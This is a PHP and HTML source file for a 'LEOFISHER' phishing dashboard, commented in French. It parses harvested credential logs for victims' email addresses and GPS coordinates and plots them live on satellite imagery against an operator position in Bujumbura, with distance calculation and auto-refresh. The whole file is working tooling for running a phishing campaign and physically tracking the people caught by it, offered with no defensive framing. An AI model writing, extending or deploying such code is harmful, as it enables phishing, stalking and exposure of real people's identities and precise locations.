<?php
date_default_timezone_set('Africa/Bujumbura');
$creds_file = 'creds.txt';
$victims = [];

// Parseur PRO - extrait TOUS GPS + infos depuis logs ASCII
if (file_exists($creds_file)) {
    $logs = file_get_contents($creds_file);
    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);
    
    foreach ($entries as $entry) {
        if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
            if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
                $email = trim($email_match[1]);
                $lat = floatval($gps_match[1]);
                $lng = floatval($gps_match[2]);
                if ($lat != 0 && $lng != 0 && abs($lat) < 90 && abs($lng) < 180) { // Valid GPS
                    $victims[] = [
                        'lat' => $lat,
                        'lng' => $lng,
                        'email' => $email,
                        'ip' => 'N/A', // Extract if needed
                        'time' => date('H:i:s')
                    ];
                }
            }
        }
    }
}

// Coordonnées OPÉRATEUR Bujumbura (toi)
$op_lat = -3.361378;
$op_lng = 29.359912;
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>LEOFISHER GPS DASHBOARD PRO 2025 - Live Tracking</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <!-- Leaflet + Plugins PRO -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
        body { margin: 0; font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
        #map { height: 100vh; width: 100%; }
        .dashboard { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.9); padding: 15px; border: 2px solid #00ff00; border-radius: 5px; z-index: 1000; }
        .stats { font-size: 14px; margin: 5px 0; }
        .victim-count { color: #ff0000; font-weight: bold; font-size: 18px; }
        .op-marker { font-size: 20px; color: #ffff00 !important; }
        .victim-marker { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .zoom-controls { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.9); padding: 10px; border: 2px solid #00ff00; border-radius: 5px; z-index: 1000; }
        .zoom-btn { background: #00ff00; color: #000; border: none; padding: 8px 12px; margin: 2px; cursor: pointer; font-weight: bold; border-radius: 3px; }
        .zoom-btn:hover { background: #00cc00; }
    </style>
</head>
<body>
    <div id="map"></div>
    
    <div class="dashboard">
        <div class="stats"><strong>🚨 LEOFISHER GPS DASH PRO 2025</strong></div>
        <div class="stats victim-count">🎯 Victimes: <span id="victimCount">0</span></div>
        <div class="stats">📍 Opérateur: Bujumbura (-3.36, 29.36)</div>
        <div class="stats">🛰️ Satellite: Esri WorldImagery HD 2025 (Zoom 22)</div>
        <div class="stats">🔄 Auto-refresh: 5s</div>
    </div>
    
    <div class="zoom-controls">
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 1)">🔍 Zoom +</button>
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 1)">🔎 Zoom -</button>
        <button class="zoom-btn" onclick="map.fitBounds(bounds)">📐 Fit All</button>
    </div>

    <!-- Leaflet JS + Plugins -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
    
    <script>
        let map, markers = L.markerClusterGroup({ spiderfyOnMaxZoom: true, showCoverageOnHover: true, zoomToBoundsOnClick: true });
        let bounds = L.latLngBounds();
        const opLat = <?php echo $op_lat; ?>;
        const opLng = <?php echo $op_lng; ?>;
        const victims = <?php echo json_encode($victims); ?>;

        // SATELLITE 2025 HD Esri WorldImagery (maxZoom 22, roads overlay)
        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
            attribution: '© Esri WorldImagery 2025 HD',
            maxZoom: 22,
            minZoom: 1
        });
        
        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap',
            opacity: 0.7,
            maxZoom: 22
        });

        map = L.map('map', {
            layers: [satellite, roads],
            zoomControl: false,
            minZoom: 1,
            maxZoom: 22
        }).setView([opLat, opLng], 10);

        // OPÉRATEUR MARKER VISIBLE (jaune gros)
        const opMarker = L.marker([opLat, opLng], {
            icon: L.divIcon({
                className: 'op-marker',
                html: '🟡 <strong>OP</strong>',
                iconSize: [30, 30]
            })
        }).addTo(map).bindPopup('<b>🚨 OPÉRATEUR Bujumbura</b><br>Position fixe');
        bounds.extend([opLat, opLng]);

        // VICTIMES MARKERS VISIBLE (rouges clignotants PRO)
        victims.forEach((victim, index) => {
            const victimMarker = L.marker([victim.lat, victim.lng], {
                icon: L.divIcon({
                    className: 'victim-marker',
                    html: `🔴 #${index+1}`,
                    iconSize: [25, 25],
                    className: 'victim-marker'
                })
            }).addTo(map).bindPopup(`
                <div style="font-family: monospace; color: #ff0000;">
                    <h3>🎯 VICTIME #${index+1}</h3>
                    <strong>📧 Email:</strong> ${victim.email}<br>
                    <strong>📍 GPS:</strong> ${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}<br>
                    <strong>🕒 Time:</strong> ${victim.time}
                </div>
            `);
            
            markers.addLayer(victimMarker);
            bounds.extend([victim.lat, victim.lng]);
        });

        map.addLayer(markers);
        if (bounds.isValid()) map.fitBounds(bounds);

        // Distance Haversine PRO (km + walk/drive time)
        function haversine(lat1, lon1, lat2, lon2) {
            const R = 6371;
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return R * c;
        }

        // Update stats
        document.getElementById('victimCount').textContent = victims.length;

        // Auto-refresh PRO 5s
        setInterval(() => { location.reload(); }, 5000);
    </script>
</body>
</html>
